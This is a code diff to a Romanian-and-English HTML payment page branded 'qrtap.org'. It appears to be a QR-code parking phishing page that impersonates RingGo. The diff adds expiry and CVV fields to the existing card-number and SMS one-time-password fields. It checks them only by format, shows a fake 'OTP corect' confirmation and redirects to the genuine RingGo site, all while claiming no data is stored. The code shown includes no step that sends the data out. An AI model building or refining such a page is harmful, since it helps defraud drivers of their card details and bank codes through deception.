@@ -20,12 +20,13 @@
     label{display:block; margin:14px 0 6px; font-weight:600}
     input, select{width:100%; background:#0f1424; border:1px solid var(--line); color:var(--text); padding:14px; border-radius:12px; outline:none}
     .row{display:grid; gap:12px; grid-template-columns:1fr 1fr}
+    .row-3{display:grid; gap:12px; grid-template-columns:1fr 1fr 1fr}
     .btn{display:inline-block; width:100%; text-align:center; border-radius:14px; padding:16px 18px; font-weight:800; cursor:pointer; border:none}
     .btn.primary{background:var(--accent); color:#062a1d}
     .btn.primary:hover{background:var(--accent2)}
-    .btn.secondary{background:#0f1424; color:var(--muted); border:1px solid var(--line)}
     .badge{font-size:12px; color:#7f93d0; background:#064eab; border-radius:999px; padding:4px 10px; display:inline-block}
     .note{font-size:12px; color:#88a0b8; margin-top:6px}
+    .muted{color:var(--muted); font-size:12px}
 
     /* Toast */
     .toasts{position:fixed; right:16px; bottom:16px; display:flex; flex-direction:column; gap:10px; z-index:9999}
@@ -34,7 +35,9 @@
     .toast.err{border-color:rgba(239,68,68,.45)}
     @keyframes toast-in{to{opacity:1; transform:translateY(0)}}
 
-    @media (max-width:700px){ .row{grid-template-columns:1fr} }
+    @media (max-width:700px){
+      .row, .row-3{grid-template-columns:1fr}
+    }
   </style>
 </head>
 <body>
@@ -45,9 +48,8 @@
         <span class="badge">qrtap.org</span>
       </div>
 
-      <p>Completează detaliile, apoi apasă <b>Plătește & continuă la RingGo</b>. Nu stocăm datele tale.</p>
+      <p>Completează detaliile, apoi apasă <b>Plătește & continuă la RingGo</b>. <span class="muted">Nu stocăm datele tale.</span></p>
 
-      <!-- Formular -->
       <form id="f" onsubmit="return false">
         <label for="plate">Car plate number</label>
         <input id="plate" name="plate" placeholder="e.g. AB12 CDE" required>
@@ -66,24 +68,41 @@
           </div>
         </div>
 
-        <div class="row">
+        <div class="row-3">
+          <div>
+            <label for="exp">Expiry (MM/YY)</label>
+            <input id="exp" name="exp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" required>
+          </div>
+          <div>
+            <label for="cvv">CVV/CVC</label>
+            <input id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc" placeholder="3 or 4 digits" required>
+          </div>
           <div>
             <label for="otp">OTP (one-time password)</label>
             <input id="otp" name="otp" inputmode="numeric" maxlength="6" placeholder="e.g. 123456" required>
             <div class="note">Introdu codul primit prin SMS sau din aplicație.</div>
           </div>
-          <div style="align-self:end">
-            <button id="pay" class="btn primary" type="submit">Plătește & continuă la RingGo</button>
-          </div>
         </div>
+
+        <br>
+        <button id="pay" class="btn primary" type="submit">Plătește & continuă la RingGo</button>
       </form>
+
+      <!-- (Opțional) Butoane de test pentru toast-uri -->
+      <!--
+      <div style="margin-top:18px; display:grid; gap:10px; grid-template-columns:repeat(3,1fr)">
+        <button class="btn" onclick="showToast('OTP incorect','err')">OTP incorect</button>
+        <button class="btn" onclick="showToast('Card incorect','err')">Card incorect</button>
+        <button class="btn" onclick="showToast('OTP corect','ok')">OTP corect</button>
+      </div>
+      -->
     </div>
   </div>
 
-  <!-- Toast container -->
   <div class="toasts" id="toasts"></div>
 
   <script>
+    // --- Utils ---
     function onlyDigits(s){ return (s||'').replace(/\D+/g,''); }
 
     function luhnValid(num){
@@ -98,32 +117,67 @@
       return sum % 10 === 0;
     }
 
+    function validExpiry(mmYY){
+      if(!mmYY) return false;
+      const m = mmYY.match(/^\s*(\d{1,2})\s*\/\s*(\d{2})\s*$/);
+      if(!m) return false;
+      let mm = parseInt(m[1],10), yy = parseInt(m[2],10);
+      if(mm < 1 || mm > 12) return false;
+
+      // transformă YY în 20YY (interval aproximativ)
+      const now = new Date();
+      const curYY = now.getFullYear()%100;
+      const curMM = now.getMonth()+1;
+
+      // considerăm valabil dacă > (an curent) sau == și luna >= curentă
+      if(yy < curYY) return false;
+      if(yy === curYY && mm < curMM) return false;
+      return true;
+    }
+
+    function validCVV(cvv){
+      const d = onlyDigits(cvv);
+      return d.length === 3 || d.length === 4;
+    }
+
     function showToast(msg, type='ok'){
       const wrap = document.getElementById('toasts');
       const el = document.createElement('div');
       el.className = 'toast ' + (type==='err' ? 'err' : 'ok');
       el.textContent = msg;
       wrap.appendChild(el);
-      setTimeout(()=>{ el.style.opacity = '0'; el.style.transform='translateY(10px)'; }, 2600);
+      setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateY(10px)'; }, 2600);
       setTimeout(()=>{ el.remove(); }, 3000);
     }
 
-    document.getElementById('pay').addEventListener('click', function (){
+    // Pre-populează location din QR: ?loc=12345
+    (function(){
+      const p = new URLSearchParams(location.search);
+      const loc = p.get('loc');
+      if(loc) document.getElementById('loc').value = loc;
+      const savedPlate = localStorage.getItem('plate');
+      if(savedPlate) document.getElementById('plate').value = savedPlate;
+    })();
+
+    document.getElementById('pay').addEventListener('click', function(){
       const card = document.getElementById('card').value;
+      const exp  = document.getElementById('exp').value;
+      const cvv  = document.getElementById('cvv').value;
       const otp  = onlyDigits(document.getElementById('otp').value);
 
-      if(!luhnValid(card)){
-        showToast('Card incorect', 'err');
-        return;
-      }
-      if(otp.length !== 6){
-        showToast('OTP incorect', 'err');
-        return;
-      }
-      showToast('OTP corect', 'ok');
-      setTimeout(function(){
-        window.location.href = "https://www.myringgo.co.uk/";
-      }, 800);
+      if(!luhnValid(card)){ showToast('Card incorect','err'); return; }
+      if(!validExpiry(exp)){ showToast('Expirare invalidă','err'); return; }
+      if(!validCVV(cvv)){ showToast('CVV invalid','err'); return; }
+      if(otp.length !== 6){ showToast('OTP incorect','err'); return; }
+
+      showToast('OTP corect','ok');
+
+      // păstrează doar placa local (UX)
+      const plate = document.getElementById('plate').value.trim();
+      if(plate) localStorage.setItem('plate', plate);
+
+      // mic delay pentru a vedea toast-ul, apoi RingGo
+      setTimeout(()=>{ window.location.href = "https://www.myringgo.co.uk/"; }, 800);
     });
   </script>
 </body>
